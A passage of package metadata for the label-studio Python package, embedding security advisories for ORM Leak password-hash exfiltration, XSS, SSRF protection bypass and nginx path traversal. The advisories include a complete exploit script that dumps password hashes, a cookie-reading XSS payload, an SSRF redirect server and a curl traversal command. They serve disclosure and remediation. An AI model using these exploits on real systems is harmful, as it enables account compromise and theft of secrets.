elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.8.1.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.8.1.post0/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.21.post0)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.8.1.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"77dd72e9eb60dd86a1e7502d75e69f9a6b7b139eadd4a5427e5eb6e877f32db6","md5":"df2859ae2b8ba74123323d55df092160","sha256":"45881255f29140ee5e7f6174f9a1696f1aae557f22efcb7f0991ca440da50d16"},"downloads":-1,"filename":"label_studio-0.8.1.post0-py3-none-any.whl","has_sig":false,"md5_digest":"df2859ae2b8ba74123323d55df092160","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":10304447,"upload_time":"2020-11-30T22:36:35","upload_time_iso_8601":"2020-11-30T22:36:35.719085Z","url":"https://files.pythonhosted.org/packages/77/dd/72e9eb60dd86a1e7502d75e69f9a6b7b139eadd4a5427e5eb6e877f32db6/label_studio-0.8.1.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"e2c3bab80e649f7c43b73a1366f98be04b0e41820d1bd3bf26a70b2312d0f707","md5":"91a2766db743c1d056c28841aaf569cd","sha256":"645a145710ae1b4a1b2c4e51fc29cd95d744e8f9391924f863b6bc604cbe1d9e"},"downloads":-1,"filename":"label-studio-0.8.1.post0.tar.gz","has_sig":false,"md5_digest":"91a2766db743c1d056c28841aaf569cd","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":10207181,"upload_time":"2020-11-30T22:36:39","upload_time_iso_8601":"2020-11-30T22:36:39.559246Z","url":"https://files.pythonhosted.org/packages/e2/c3/bab80e649f7c43b73a1366f98be04b0e41820d1bd3bf26a70b2312d0f707/label-studio-0.8.1.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    